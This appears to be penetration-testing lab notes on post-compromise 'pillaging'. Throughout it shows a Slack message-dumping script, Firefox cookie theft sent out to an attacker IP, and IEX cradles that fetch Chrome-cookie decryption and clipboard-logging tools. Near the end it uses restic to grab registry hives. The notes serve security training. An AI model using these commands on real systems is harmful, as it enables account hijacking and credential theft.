    getFilesforChannelOrGroup($groupsMetaDir)

    Write-Host -ForegroundColor Cyan "Getting files for each IM"
    getFilesforChannelOrGroup($imsMetaDir)

    Write-Host -ForegroundColor Cyan "Getting files for each Multi-Party IM (mpim)"
    getFilesforChannelOrGroup($mpimsMetaDir)
}

function getSlackToken {
    Write-Host -ForegroundColor Cyan "Getting Slack Token"
    $session = getSession
    $response = Invoke-WebRequest -Uri "$SlackUrl/messages" -WebSession $session -UserAgent $ua



    if($response.toString() -match 'api_token.*?(xox[csxbp]-[0-9\-a-fA-F]*)' ){
        Write-Host -ForegroundColor Cyan $matches[1]
        return $matches[1]
    }
    #if you get to here, then the slack token was not found
    Write-Host -ForegroundColor Red "!!Unable to extract the slack token using the given cookie, please check that your dCookie value is valid."
    break
}

function SmashJson($folder,$outFileName){
    $batchSize = 1000
    $outFile = Join-Path $folder $outFileName
    if(test-path $outFile){ Remove-Item $outFile}
    $files = Get-ChildItem -path $folder -recurse |?{ ! $_.PSIsContainer } |?{$_.extension -eq ".json"} 
    "[" | Out-File -filepath $outFile -Append
    $count = 0
    $counter = 0
    $batchResult = New-Object System.Collections.ArrayList
    foreach($file in $files){
        $content = [System.IO.File]::ReadAllText($file.FullName)
        $ignore = $batchResult.Add($content)
        $counter = $counter + 1
        $count = $count + 1
        if($count -eq $files.Length -or $counter -eq $batchSize){
            $batchResult -join "," | Out-File -filepath $outFile -Append
            if($count -eq $files.Length){ break}
            "," | Out-File -filepath $outFile -Append
            $counter = 0
            $batchResult.Clear()
         }        
     }
    "]" | Out-File -filepath $outFile -Append
}

#Get the slack api token pragmatically if it wasn't provided by the user as a parameter
if(-not $SlackToken){
    $SlackToken = getSlackToken
}


$headers = @{}
$headers.Add("Authorization", "Bearer " + $SlackToken)

if($ExtractUsers){ 
    Write-Host -ForegroundColor Cyan "Extracting up to $MaxUsers profiles from this workspace."
    getUsers
    metaToCSV $usersDir $true
    Write-Host -ForegroundColor Green "`nDONE! Remove the -ExtractUsers flag to download messages and files."
    break 
}

if($ExtractAccessLogs){ 
    Write-Host -ForegroundColor Cyan "Extracting up to $MaxAccessLogs access logs from this workspace. See $accessLogsDir"
    getAccessLogs
    $file = "accesslogs.json"
    Write-Host -ForegroundColor Cyan "Done extracting individual logs. Now concatenating all logs into single $file file."
    SmashJson $accessLogsDir $file
    Write-Host -ForegroundColor Green "`nDONE! Access logs are stored at $accessLogsDir. Remove the -ExtractAccessLogs flag to download messages and files."
    break 
}

if(-Not $PrivateOnly){
    getChannelsMeta("public_channel")
    metaToCSV($channelsMetaDir)
    getMessages($channelsMetaDir)
}

getChannelsMeta("private_channel")
metaToCSV($groupsMetaDir)
getMessages($groupsMetaDir)

getChannelsMeta("im")
metaToCSV($imsMetaDir)
getMessages($imsMetaDir)

getChannelsMeta("mpim")
metaToCSV($mpimsMetaDir)
getMessages($mpimsMetaDir)

getFilesMeta
getFiles


$CurrentTime = $timer.Elapsed
write-host -ForegroundColor Green $([string]::Format("`nDONE! Run Time: {0:d2}:{1:d2}:{2:d2}",
        $CurrentTime.hours, 
        $CurrentTime.minutes, 
        $CurrentTime.seconds)) -nonewline

}
```

Their research discusses the cookie named `d`, which `Slack` uses to store the user's authentication token. If we can get our hands on that cookie, we will be able to authenticate as the user.



### Cookie Extraction from Firefox with cookieextractor.py

```powershell
# Copy Firefox Cookies Database
copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .
```

Now we use PSUpload.ps1 to download the file to our attacking machine. We set up the uploader server in our kali:

```
python -m uploadserver
```

And from the host target machine:

```
Invoke-FileUpload -Uri http://10.10.15.105:8000/upload -File c:\Users\Grace\Desktop\cookies.sqlite
```

Now that we have the file cookies.sqlite, we use the Python script [cookieextractor.py](https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/cookieextractor.py) to extract cookies from the Firefox cookies:

The script:

```python
#!/usr/bin/env python3
# Sample Script to extract cookies offile from FireFox sqlite database 
# Created by PlainText 

import argparse
import sqlite3

def main(dbpath, host, cookie):
	conn = sqlite3.connect(dbpath)
	cursor = conn.cursor()

	if (host == "" and cookie == ""):
		query = "SELECT * FROM moz_cookies"
	elif (host != "" and cookie == ""):
		query = "SELECT * FROM moz_cookies WHERE host LIKE '%{}%'".format(host)
	elif (host == "" and cookie != ""):
		query = "SELECT * FROM moz_cookies WHERE name LIKE '%{}%'".format(cookie)
	elif (host != "" and cookie != ""):
		query = "SELECT * FROM moz_cookies WHERE name LIKE '%{}%' AND host LIKE '%{}%'".format(cookie, host)

	cursor.execute(query)
	records = cursor.fetchall()
	rowCount = len(records) 

	if (rowCount > 0):
		for row in records:
			print(row)
	else:
		print("[-] No cookie found with the selected options.")

	conn.close()

if __name__ == "__main__":
	parser = argparse.ArgumentParser()
	parser.add_argument("--dbpath", "-d", required=True, help="The path to the sqlite cookies database")
	parser.add_argument("--host", "-o", required=False, help="The host for the cookie", default="")
	parser.add_argument("--cookie", "-c", required=False, help="The name of the cookie", default="")
	args = parser.parse_args()
	main(args.dbpath, args.host, args.cookie)
```

Basic usage:

```shell-session
python3 cookieextractor.py --dbpath "/home/plaintext/cookies.sqlite" --host slack --cookie d
```

Output:

```
(10, '', 'd', 'xoxd-VGhpcyBpcyBhIGNvb2tpZSB0byBzaW11bGF0ZSBhY2Nlc3MgdG8gU2xhY2ssIHN0ZWFsaW5nIGEgY29va2llIGZyb20gYSBicm93c2VyLg==', '.api.slacktestapp.com', '/', 7975292868, 1663945037085000, 1663945037085002, 0, 0, 0, 1, 0, 2)
```

Now that we have the cookie, we can use any browser extension to add the cookie to our browser. For this example, we will use Firefox and the extension [Cookie-Editor](https://cookie-editor.cgagnier.ca/). Make sure to install the extension by clicking the link, selecting your browser, and adding the extension. 

Once you save the cookie, refresh the target page, which was slack.com, and you are logged in as the user.

Now we are logged in as the user and can click on `Launch Slack`.

We may get a prompt for credentials or other types of authentication information; we can repeat the above process and replace the cookie `d` with the same value we used to gain access the first time on any website that asks us for information or credentials.

Once we complete this process for every website where we get a prompt, we need to refresh the browser, click on `Launch Slack` and use Slack in the browser.


 ### Cookie Extraction from Chromium-based Browsers

The chromium-based browser also stores its cookies information in an SQLite database. The only difference is that the cookie value is encrypted with [Data Protection API (DPAPI)](https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection). `DPAPI` is commonly used to encrypt data using information from the current user account or computer.

To get the cookie value, we'll need to perform a decryption routine from the session of the user we compromised.

[SharpChromium](https://github.com/djhohnstein/SharpChromium) does what we need: It connects to the current user SQLite cookie database, decrypts the cookie value, and presents the result in JSON format.

Let's use [Invoke-SharpChromium](https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1), a PowerShell script created by [S3cur3Th1sSh1t](https://twitter.com/ShitSecure) which uses reflection to load SharpChromium.

**PowerShell Script - Invoke-SharpChromium**

```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSh
arpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1')

Invoke-SharpChromium -Command "cookies slack.com"
```

We got an error because the cookie file path that contains the database is hardcoded in [SharpChromium](https://github.com/djhohnstein/SharpChromium/blob/master/ChromiumCredentialManager.cs#L47), and the current version of Chrome uses a different location. **Copy Cookies to SharpChromium Expected Location**:

```powershell
copy "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies" "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"
```

We can now use Invoke-SharpChromium again to get a list of cookies in JSON format.

```powershell
Invoke-SharpChromium -Command "cookies slack.com"
```

**Note:** When copy/pasting the contents of a cookie, make sure the value is one line.


## Clipboard

In many companies, network administrators use password managers to store their credentials and copy and paste passwords into login forms.

We can use the [Invoke-Clipboard](https://github.com/inguardians/Invoke-Clipboard/blob/master/Invoke-Clipboard.ps1) script to extract user clipboard data. Start the logger by issuing the command below.

```
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/inguardians/Invoke-Clipboard/master/Invoke-Clipboard.ps1')

Invoke-ClipboardLogger
```

The script will start to monitor for entries in the clipboard and present them in the PowerShell session. We need to be patient and wait until we capture sensitive information.


## Roles and Services

Typical server roles and services include:

- File and Print Servers
- Web and Database Servers
- Certificate Authority Servers
- Source Code Management Servers
- Backup Servers

### Attacking Backup Servers

In information technology, a `backup` or `data backup` is a copy of computer data taken and stored elsewhere so that it may be used to restore the original after a data loss event.

If we gain access to a `backup system`, we may be able to review backups, search for interesting hosts and restore the data we want.

#### restic 

`Restic` is a modern backup program that can back up files in Linux, BSD, Mac, and Windows.

To start working with `restic`, we must create a `repository` (the directory where backups will be stored).

`Restic` checks if the environment variable `RESTIC_PASSWORD` is set and uses its content as the password for the repository.

If this variable is not set, it will ask for the password to initialize the repository and for any other operation in this repository.


##### How it works

We will use `restic 0.13.1` and back up the repository `C:\xampp\htdocs\webapp` in `E:\restic\` directory. To download the latest version of restic, visit [https://github.com/restic/restic/releases/latest](https://github.com/restic/restic/releases/latest). On our target machine, restic is located at `C:\Windows\System32\restic.exe`.

We first need to create and initialize the location where our backup will be saved, called the `repository`.

```powershell-session
 mkdir E:\restic2; restic.exe -r E:\restic init
```

Then we can create our first backup.

```powershell-session
$env:RESTIC_PASSWORD = 'Password'
restic.exe -r E:\restic\ backup C:\SampleFolder
```

If we want to back up a directory such as `C:\Windows`, which has some files actively used by the operating system, we can use the option `--use-fs-snapshot` to create a VSS (Volume Shadow Copy) to perform the backup.

```powershell-session
restic.exe -r E:\restic\ backup C:\Windows\System32\config --use-fs-snapshot
```

**Note:** If the user doesn't have the rights to access or copy the content of a directory, we may get an Access denied message. The backup will be created, but no content will be found.

##### How to pentest it

We can also check which backups are saved in the repository using the `snapshot` command.

```powershell-session
restic.exe -r E:\restic\ snapshots
```

Output:

```
found 1 old cache directories in C:\Users\jeff\AppData\Local\restic, run `restic cache --cleanup` to remove them
ID        Time                 Host             Tags        Paths
--------------------------------------------------------------------------------------
02d25030  2022-08-09 05:58:15  PILLAGING-WIN01              C:\xampp\htdocs\webapp
24504d3d  2022-08-09 11:24:43  PILLAGING-WIN01              C:\Windows\System32\config
7b9cabc8  2022-08-09 11:25:47  PILLAGING-WIN01              C:\Windows\System32\config
4e7bd0cd  2022-08-09 11:55:33  PILLAGING-WIN01              C:\xampp\htdocs\webapp_old
b2f5caa0  2022-08-17 11:43:56  PILLAGING-WIN01              C:\Windows\System32\config
--------------------------------------------------------------------------------------
5 snapshots
```


We can restore a backup using the ID.

```powershell
restic.exe -r E:\restic\ restore 11dcaee2 --target C:\Restore
```

And of course we can create a backup: 

```
$env:RESTIC_PASSWORD = 'Superbackup!'
restic.exe -r E:\restic\ backup C:\SampleFolder
```
